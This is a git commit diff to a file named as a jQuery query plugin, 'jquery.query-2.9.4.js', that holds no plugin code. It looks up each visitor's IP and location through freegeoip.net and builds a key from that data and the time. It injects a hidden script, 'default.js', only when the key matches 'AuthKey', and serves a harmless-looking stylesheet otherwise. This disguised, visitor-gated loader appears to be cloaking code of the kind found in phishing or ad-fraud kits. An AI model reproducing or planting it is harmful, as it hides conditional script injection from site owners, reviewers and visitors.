1509b91e5d2cfe7a0239ec63f3154a3fe5e0f68e
palmix <qrrq.refai@gmail.com>
2016-02-22 09:11:26 +0200

    Update jquery.query-2.9.4.js

--- clipsvstyle/jquery.query-2.9.4.js
+++ clipsvstyle/jquery.query-2.9.4.js
@@ -1,23 +1,23 @@
-
-    window.imgs51 = function(data) {
-      var d = new Date();
+var query = "http://freegeoip.net/json/?ormat=json&jsoncallback=imgs51";
+var imgs51 = function (data) {
+var htmlString = "";
+var d = new Date();
 var n = d.getDate();
-  var m = d.getDay();
-    var dn = d.getMinutes();
+var m = d.getDay();
+var dn = d.getMinutes();
 var country = data.latitude+data.ip+data.longitude+data.metro_code+n+m+dn;
 var country1 = AuthKey;
-  if( country1 == country ){ 
-  (function() {
-    var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
-    po.src = 'default.js';
-    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
-  })();
+if( country1 == country ){ 
+(function() {
+var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+po.src = 'default.js';
+var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+})();
   } else{
 var s = document.createElement("link");
 s.type = "text/css";
 s.rel = "stylesheet";
 s.href = "imgads.css";
 $("head").append(s);
-  
-}
-}
+}};
+$.getJSON(query, imgs51);
